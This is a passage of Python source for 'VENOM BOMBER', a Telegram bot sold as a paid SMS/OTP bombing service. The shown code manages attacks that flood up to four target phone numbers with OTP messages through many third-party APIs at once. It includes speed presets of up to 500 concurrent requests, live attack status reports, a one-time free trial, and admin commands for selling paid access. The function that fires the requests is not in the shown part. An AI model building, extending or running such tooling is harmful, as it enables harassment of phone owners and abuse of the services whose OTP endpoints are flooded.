    context.user_data['attacking'] = False

async def update_venom_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, target_numbers: list, duration: int, is_trial: bool = False):
    """Update VENOM attack status message"""
    if not context.user_data.get('attacking', False):
        return
    
    try:
        current_time = time.time()
        attack_start_time = context.user_data['attack_start'].timestamp()
        elapsed = int(current_time - attack_start_time)
        remaining = max(0, duration - elapsed)
        
        # Calculate progress
        progress_percent = min(100, int((elapsed / duration) * 100))
        progress_bar_length = 20
        filled = int(progress_percent / 100 * progress_bar_length)
        progress_bar = "█" * filled + "░" * (progress_bar_length - filled)
        
        # Get current RPS
        current_rps = context.user_data.get('last_rps', 0.0)
        
        target_list = "\n├─ ".join(target_numbers)
        
        status_message = f"""
╔════════════════════════════════════════╗
║        ⚡💥 VENOM ATTACK ACTIVE       ║
╚════════════════════════════════════════╝

🎯 TARGETS ({len(target_numbers)}):
├─ {target_list}

⏱️ TIME: {elapsed}s / {duration}s
📊 PROGRESS: {progress_bar} {progress_percent}%
⏳ REMAINING: {remaining}s

⚡ VENOM STATS:
├─ REQUESTS: {context.user_data.get('total_requests', 0)}
├─ SUCCESS: {context.user_data.get('successful_requests', 0)}
├─ FAILED: {context.user_data.get('failed_requests', 0)}
├─ RPS: {current_rps:.1f}
└─ APIS: {TOTAL_APIS} × {len(target_numbers)} targets

📡 STATUS: ALL APIs FIRING SIMULTANEOUSLY
🕐 LAST UPDATE: {datetime.now().strftime('%H:%M:%S')}
"""
        
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=status_message
        )
    except Exception as e:
        logger.error(f"Failed to update VENOM status: {e}")

async def update_venom_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, target_numbers: list, elapsed: int, is_trial: bool = False):
    """Update final VENOM attack status"""
    try:
        status = "✅ VENOM COMPLETED" if context.user_data.get('attacking', False) else "🛑 VENOM STOPPED"
        
        # Calculate statistics
        total = context.user_data.get('total_requests', 0)
        success = context.user_data.get('successful_requests', 0)
        success_rate = (success / total * 100) if total > 0 else 0
        avg_rps = total / elapsed if elapsed > 0 else 0
        
        target_list = "\n├─ ".join(target_numbers)
        
        final_message = f"""
╔════════════════════════════════════════╗
║        ⚡💥 VENOM ATTACK RESULTS      ║
╚════════════════════════════════════════╝

🎯 TARGETS ({len(target_numbers)}):
├─ {target_list}

⏱️ DURATION: {elapsed} seconds
📊 STATUS: {status}

📈 VENOM PERFORMANCE:
├─ TOTAL REQUESTS: {total}
├─ SUCCESSFUL: {success}
├─ FAILED: {context.user_data.get('failed_requests', 0)}
├─ SUCCESS RATE: {success_rate:.1f}%
├─ AVG RPS: {avg_rps:.1f}
├─ OTPS/SEC: ~{avg_rps / TOTAL_APIS if TOTAL_APIS > 0 else 0:.1f}
└─ TOTAL APIS: {TOTAL_APIS}

⚡ ATTACK SUMMARY:
├─ Mode: VENOM ATTACK (Maximum Speed)
├─ Strategy: All APIs firing simultaneously at ALL targets
├─ Concurrency: 500 parallel requests
└─ Speed: Ultra High
"""
        
        if is_trial:
            final_message += f"""
⚠️ TRIAL STATUS:
├─ ❌ Your free trial is now PERMANENTLY USED
├─ 🔒 Trial access is NOW BLOCKED
├─ ⚠️ You cannot use trial again
├─ 💰 Contact admin for paid access
└─ 👑 @Venompratap
"""
        else:
            final_message += f"""
💡 NEXT ACTIONS:
├─ ⚡ Use /attack for new VENOM attack
├─ 🚀 Use /speed 5 for VENOM mode
└─ 📊 Use /stats for full statistics
"""
        
        final_message += f"""
🕐 TIME INFO:
├─ STARTED: {context.user_data['attack_start'].strftime('%H:%M:%S')}
└─ ENDED: {datetime.now().strftime('%H:%M:%S')}
"""
        
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_message
        )
    except Exception as e:
        logger.error(f"Failed to update VENOM final status: {e}")

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current VENOM attack immediately"""
    user_id = update.effective_user.id
    
    if not context.user_data.get('attacking', False):
        await update.message.reply_text(
            "ℹ️ No active attack to stop.\n"
            "Use /trial for free trial or /attack for paid attack."
        )
        return
    
    # Get attack details before stopping
    target_numbers = context.user_data.get('target_numbers', ['Unknown'])
    total_requests = context.user_data.get('total_requests', 0)
    successful_requests = context.user_data.get('successful_requests', 0)
    failed_requests = context.user_data.get('failed_requests', 0)
    attack_start = context.user_data.get('attack_start', datetime.now())
    is_trial = context.user_data.get('is_trial_attack', False)
    
    # Calculate elapsed time
    elapsed = (datetime.now() - attack_start).seconds
    
    # IMMEDIATELY stop the attack
    context.user_data['attacking'] = False
    
    # Calculate statistics
    success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
    avg_rps = total_requests / elapsed if elapsed > 0 else 0
    
    target_list = "\n├─ ".join(target_numbers)
    
    # Send immediate stop confirmation
    stop_message = f"""
╔═════════════════════════════════════╗
║      ⚡💥 VENOM ATTACK STOPPED     ║
╚═════════════════════════════════════╝

🎯 TARGETS ({len(target_numbers)}):
├─ {target_list}

⏱️ DURATION: {elapsed} seconds
📊 STATUS: STOPPED MANUALLY

📈 VENOM STATS:
├─ TOTAL REQUESTS: {total_requests}
├─ SUCCESSFUL: {successful_requests}
├─ FAILED: {failed_requests}
├─ SUCCESS RATE: {success_rate:.1f}%
├─ AVG RPS: {avg_rps:.1f}
└─ TOTAL APIS: {TOTAL_APIS}

✅ VENOM attack has been completely stopped.
⚡ No further OTPs will be sent.
"""
    
    if is_trial:
        # Get trial info
        trial_info = await get_user_trial_info(user_id)
        
        stop_message += f"""
⚠️ TRIAL STATUS:
├─ ❌ Your ONE-TIME trial is now USED
├─ 🔒 Trial access is PERMANENTLY BLOCKED
├─ ⚠️ Cannot use trial again
├─ 💰 Contact admin for paid access
└─ 👑 @Venompratap
"""
    else:
        stop_message += f"""
💡 NEXT ACTIONS:
├─ ⚡ Use /attack for new VENOM attack
├─ 🚀 Use /speed 5 for VENOM mode
└─ 📊 Use /stats for full statistics
"""
    
    await update.message.reply_text(stop_message)
    
    # Also update the status message if it exists
    try:
        chat_id = context.user_data.get('status_chat_id')
        message_id = context.user_data.get('status_message_id')
        
        if chat_id and message_id:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=stop_message
            )
    except Exception as e:
        logger.debug(f"Could not update status message: {e}")
    
    # Clear attack data
    attack_keys = [
        'target_numbers', 'attack_duration', 'attack_start', 'attack_end',
        'total_requests', 'successful_requests', 'failed_requests',
        'status_message_id', 'status_chat_id', 'last_rps_update',
        'requests_since_last_update', 'last_rps', 'speed_settings',
        'last_status_update', 'is_trial_attack'
    ]
    
    for key in attack_keys:
        context.user_data.pop(key, None)

async def speed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle speed control command - Paid users only"""
    user_id = update.effective_user.id
    
    # Check if user is authorized (paid user)
    if not await is_user_authorized(user_id):
        trial_info = await get_user_trial_info(user_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║    🔒 PAID FEATURE    ║
╚═══════════════════════╝

Speed control is available for PAID USERS only.

🎁 Your Trial Status:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: ❌ No

⚡ Trial Users Speed:
Speed is fixed at Level 5 (VENOM MODE) for trial.

💰 Contact Admin for Full Access:
@Venompratap
"""
        )
        return
    
    current_settings = await get_user_speed_settings(user_id)
    current_level = current_settings['speed_level']
    
    if not context.args:
        # Show current speed settings
        preset = SPEED_PRESETS[current_level]
        
        message = f"""
╔═══════════════════════╗
║     ⚡ SPEED LEVELS    ║
╚═══════════════════════╝

📊 Current Settings:
├─ Name: {preset['name']}
├─ Level: {current_level}
├─ Concurrent: {current_settings['max_concurrent']}
├─ Delay: {current_settings['delay']}s
└─ Description: {preset['description']}

🎯 Available Levels:
├─ 1️⃣ Level 1: 🐢 Very Slow
│   ├─ Concurrent: 30
│   └─ Delay: 0.5s
├─ 2️⃣ Level 2: 🚶 Slow
│   ├─ Concurrent: 50
│   └─ Delay: 0.3s
├─ 3️⃣ Level 3: ⚡ Medium
│   ├─ Concurrent: 100
│   └─ Delay: 0.1s
├─ 4️⃣ Level 4: 🚀 Fast
│   ├─ Concurrent: 200
│   └─ Delay: 0.05s
└─ 5️⃣ Level 5: ⚡💥 VENOM MODE
    ├─ Concurrent: 500
    └─ Delay: 0.01s

💡 Usage: /speed <level>
📌 Example: /speed 5 for VENOM ATTACK
"""
        
        await update.message.reply_text(message)
        return
    
    # Set new speed level
    try:
        new_level = int(context.args[0])
        
        if new_level not in SPEED_PRESETS:
            await update.message.reply_text(
                """
╔═══════════════════════╗
║  ❌ INVALID LEVEL    ║
╚═══════════════════════╝

Please use level 1-5:
1️⃣ 🐢 Very Slow
2️⃣ 🚶 Slow
3️⃣ ⚡ Medium
4️⃣ 🚀 Fast
5️⃣ ⚡💥 VENOM MODE
"""
            )
            return
        
        # Apply preset
        preset = SPEED_PRESETS[new_level]
        new_settings = {
            'speed_level': new_level,
            'max_concurrent': preset['max_concurrent'],
            'delay': preset['delay']
        }
        
        await set_user_speed_settings(user_id, new_settings)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║   ✅ SPEED UPDATED   ║
╚═══════════════════════╝

📊 New Settings Applied:
├─ Name: {preset['name']}
├─ Level: {new_level}
├─ Concurrent: {preset['max_concurrent']}
├─ Delay: {preset['delay']}s
└─ Description: {preset['description']}

⚡ Next attack will use these settings.
"""
        )
        
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input!\n"
            "Use /speed to see settings or /speed 1-5 to change."
        )

# =============== ADMIN COMMANDS ===============

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add paid user (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /add <user_id> [username]\n"
            "Example: /add 1234567890 Username"
        )
        return
    
    try:
        target_id = int(context.args[0])
        username = context.args[1] if len(context.args) > 1 else "Unknown"
        
        # Clean the username
        clean_username = clean_text(username)
        
        # Add as paid user with trial blocked
        await add_authorized_user(target_id, clean_username, f"User {target_id}", user_id, True)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║    ✅ USER ADDED     ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Username: {clean_username}
├─ Status: ✅ PAID USER
├─ Trial: ❌ PERMANENTLY BLOCKED
├─ Added by: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User can now use VENOM ATTACK with /attack
❌ Trial access is PERMANENTLY blocked
💰 User has full paid access
"""
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /remove <user_id>\n"
            "Example: /remove 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        await remove_authorized_user(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║    ✅ USER REMOVED   ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Removed by: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

❌ User can no longer use VENOM ATTACK.
❌ Both trial and paid access removed.
❌ User needs to be re-added for access.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def reset_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /resettrial <user_id>\n"
            "Example: /resettrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Reset trial for user
        await reset_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║  ✅ TRIAL RESET      ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Reset
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User's trial has been reset.
✅ Trial counter set to 0.
✅ Trial access UNBLOCKED.
✅ Can use /trial again (ONE TIME ONLY).
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def block_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /blocktrial <user_id>\n"
            "Example: /blocktrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Block trial for user
        await block_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║  ✅ TRIAL BLOCKED    ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Blocked
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

❌ User's trial has been PERMANENTLY BLOCKED.
❌ Cannot use /trial command.
💰 Contact admin for paid access only.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def unblock_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /unblocktrial <user_id>\n"
            "Example: /unblocktrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Unblock trial for user
        await unblock_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║  ✅ TRIAL UNBLOCKED  ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Unblocked
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User's trial has been UNBLOCKED.
✅ Can use /trial command again.
⏰ ONE-TIME USE ONLY.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all authorized users (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    users = await get_all_authorized_users()
    
    if not users:
        await update.message.reply_text("📭 No authorized users found.")
        return
    
    message = "╔══════════════════════════════════════╗\n"
    message += "║          📋 AUTHORIZED USERS        ║\n"
    message += "╚═════════════════════════════════════╝\n\n"
    
    for idx, (user_id, username, display_name, added_at, trial_count, last_trial, trial_blocked, is_paid, multi_target) in enumerate(users, 1):
        status = "💰 PAID USER" if is_paid else "🎁 TRIAL USER"
        trial_status = "✅ ACTIVE" if not trial_blocked else "❌ PERMANENTLY BLOCKED"
        
        message += f"┌─👤 USER #{idx}\n"
        message += f"│\n"
        message += f"├─ ID: {user_id}\n"
        message += f"├─ Username: {username or 'N/A'}\n"
        message += f"├─ Display Name: {display_name or 'N/A'}\n"
        message += f"├─ Status: {status}\n"
        message += f"├─ Multi-Target: {multi_target} numbers\n"
        message += f"├─ Trials Used: {trial_count}\n"
        message += f"├─ Last Trial: {last_trial.split('T')[0] if last_trial else 'Never'}\n"
        message += f"├─ Trial Status: {trial_status}\n"
        message += f"└─ Added: {added_at}\n\n"
    
    message += f"📊 Total Users: {len(users)}"
    
    await update.message.reply_text(message)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user statistics"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        username = update.effective_user.username or "Not set"
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check trial availability
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    status = "🎁 Trial Available" if trial_allowed else "💰 Paid User" if trial_info['is_paid_user'] else "🔒 Trial Used & Blocked"
    
    stats_text = f"""
╔═════════════════════════════════════╗
║          📊 VENOM STATISTICS        ║
╚═════════════════════════════════════╝

👤 USER INFORMATION
├─ ID: {user_id}
├─ Name: {clean_first_name}
├─ Username: @{update.effective_user.username or "Not set"}

🎁 TRIAL INFORMATION
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Trial Available: {"✅ Yes" if trial_allowed else "❌ No"}
└─ Reason: {reason}

⚡ VENOM ATTACK INFO
├─ Total APIs: {TOTAL_APIS}
├─ Max Speed: Level 5 (VENOM MODE)
├─ Max Concurrency: 500
├─ Max Targets: {trial_info.get('multi_target_count', 1)}
└─ Max OTPs/sec: ~{TOTAL_APIS * 10 * trial_info.get('multi_target_count', 1)}

💰 ACCOUNT STATUS
├─ Status: {status}
"""
    
    if trial_allowed:
        stats_text += """
├─ ✅ Trial Available (ONE TIME ONLY)
├─ ⏰ Duration: 60 seconds
├─ 🔒 After trial: PERMANENTLY BLOCKED
├─ ⚠️ Cannot use trial again
└─ 💰 Contact admin for paid access
"""
    elif trial_info['is_paid_user']:
        stats_text += """
├─ ✅ Paid User
├─ ⚡ Unlimited attacks
├─ 🚀 All speed levels
├─ 🎯 4 targets per attack
├─ ⏰ Max duration: No limit
└─ 👑 Thank you for purchasing!
"""
    else:
        stats_text += """
├─ ❌ Trial Used
├─ 🔒 Trial PERMANENTLY blocked
├─ ⚠️ One-time trial already used
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @Venompratap
"""
    
    await update.message.reply_text(stats_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help menu"""
    user_id = update.effective_user.id
    trial_info = await get_user_trial_info(user_id)
    trial_allowed, _ = await can_user_use_trial(user_id)
    
    status = "🎁 Trial Available" if trial_allowed else "💰 Paid User" if trial_info['is_paid_user'] else "🔒 Trial Used & Blocked"
    
    help_text = f"""
╔═════════════════════════════════════╗
║        ⚡💥 VENOM BOMBER HELP      ║
╚═════════════════════════════════════╝

👤 YOUR STATUS: {status}

⚡ VENOM ATTACK COMMANDS:
├─ /trial <number> - One-time free trial (60s)
├─ /mytrial - Check your trial status
├─ /attack <num1,num2,num3,num4> <time> - Multi-target VENOM attack
├─ /speed <1-5> - Set speed (5=VENOM Mode) - PAID ONLY
├─ /stop - Stop current attack
├─ /stats - View statistics
└─ /help - Show this menu

🎯 MULTI-TARGET FEATURES:
├─ Up to 4 numbers per attack
├─ All APIs fire at ALL targets simultaneously
├─ Combined OTP flood effect
└─ Perfect for premium users

⚠️ TRIAL RULES (STRICT - ONE TIME ONLY):
├─ ✅ Available: ONE TIME ONLY
├─ ⏰ Duration: 60 seconds
├─ ❌ After trial: PERMANENTLY BLOCKED
├─ 🔒 No further trial access
├─ 💰 Only paid access after trial
└─ 👑 Admin: @Venompratap
"""
    
    if is_admin(user_id):
        help_text += """
👑 ADMIN COMMANDS:
├─ /add <user_id> - Add paid user
├─ /remove <user_id> - Remove user
├─ /users - List all users
├─ /resettrial <user_id> - Reset user trial
├─ /blocktrial <user_id> - Permanently block trial
├─ /unblocktrial <user_id> - Unblock user trial
└─ /broadcast <msg> - Broadcast message
"""
    
    await update.message.reply_text(help_text)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /broadcast <message>\n"
            "Example: /broadcast Hello everyone!"
        )
        return
    
    message = ' '.join(context.args)
    users = await get_all_authorized_users()
    
    if not users:
        await update.message.reply_text("📭 No users to broadcast to.")
        return
    
    sent = 0
    failed = 0
    
    broadcast_msg = await update.message.reply_text(
        f"📢 Broadcasting to {len(users)} users...\n"
        f"✅ Sent: 0 | ❌ Failed: 0"
    )
    
    for user_id, username, _, _, _, _, _, _, _ in users:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"""
╔═══════════════════════════════════════╗
║        📢 BROADCAST MESSAGE          ║
╚═══════════════════════════════════════╝

{message}

📅 Date: {datetime.now().strftime('%d %b %Y')}
🕐 Time: {datetime.now().strftime('%H:%M:%S')}

👑 Sent by Admin
"""
            )
            sent += 1
        except Exception as e:
            failed += 1
            logger.error(f"Failed to send to {user_id}: {e}")
        
        # Update status every 5 sends
        if (sent + failed) % 5 == 0:
            try:
                await broadcast_msg.edit_text(
                    f"📢 Broadcasting to {len(users)} users...\n"
                    f"✅ Sent: {sent} | ❌ Failed: {failed}"
                )
            except:
                pass
        
        # Small delay to avoid rate limiting
        await asyncio.sleep(0.1)
    
    await broadcast_msg.edit_text(
        f"""
╔═══════════════════════════════════════╗
║         ✅ BROADCAST COMPLETE         ║
╚═══════════════════════════════════════╝

📊 Broadcast Results:
├─ Total Users: {len(users)}
├─ Successfully Sent: {sent}
└─ Failed: {failed}

📅 Date: {datetime.now().strftime('%d %b %Y')}
🕐 Time: {datetime.now().strftime('%H:%M:%S')}
"""
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    logger.error(f"Update {update} caused error {context.error}")

async def post_init(application: Application):
    """Initialize MongoDB connection after bot starts"""
    await mongo.connect()

async def shutdown(application: Application):
    """Clean up MongoDB connection on shutdown"""
    await mongo.close()

def main():
    """Start the bot."""
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("trial", trial))
    application.add_handler(CommandHandler("mytrial", mytrial))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("speed", speed_command))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("resettrial", reset_trial))
    application.add_handler(CommandHandler("blocktrial", block_trial))
    application.add_handler(CommandHandler("unblocktrial", unblock_trial))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("broadcast", broadcast))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    print(f"""
╔════════════════════════════════════════════╗
║        ⚡💥 VENOM BOMBER BOT 💥⚡        ║
║           ULTIMATE SMS BOMBER              ║
╚════════════════════════════════════════════╝

📡 Bot Information:
├─🤖 Bot Token: Loaded
├─📊 Total APIs: {TOTAL_APIS}
├─⚡ Attack Mode: VENOM ATTACK (Multi-Target)
├─💾 Database: MongoDB (Cloud)
├─👑 Admin Users: {len(ADMIN_USER_IDS)}
└─🔥 Status: Starting...

⚡ VENOM ATTACK FEATURES:
├─ Speed: Level 5 (VENOM MODE)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 500 parallel requests
├─ Multi-Target: Up to 4 numbers per attack
└─ OTPs: Maximum possible

⚠️ TRIAL SYSTEM (STRICT - ONE TIME ONLY):
├─ Frequency: ONE TIME ONLY
├─ Duration: 60 seconds
├─ After trial: PERMANENTLY BLOCKED
├─ No further trial access
└─ Only paid access available

🔧 Available Commands:
├─🎯 /start - Start bot
├─🆘 /help - Help menu
├─🎁 /trial - One-time free trial (60s)
├─📊 /mytrial - Check trial status
├─💥 /attack - Multi-target VENOM attack
├─⚡ /speed - Set speed (5=VENOM Mode) - PAID ONLY
├─📊 /stats - View statistics
├─🛑 /stop - Stop attack
├─🔄 /resettrial - Reset user trial (Admin)
├─🚫 /blocktrial - Block user trial (Admin)
├─✅ /unblocktrial - Unblock user trial (Admin)
├─➕ /add - Add paid user (Admin)
├─➖ /remove - Remove user (Admin)
├─📋 /users - List users (Admin)
└─📢 /broadcast - Broadcast (Admin)

🔥 BOT IS NOW RUNNING IN VENOM MODE!
Press Ctrl+C to stop
""")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
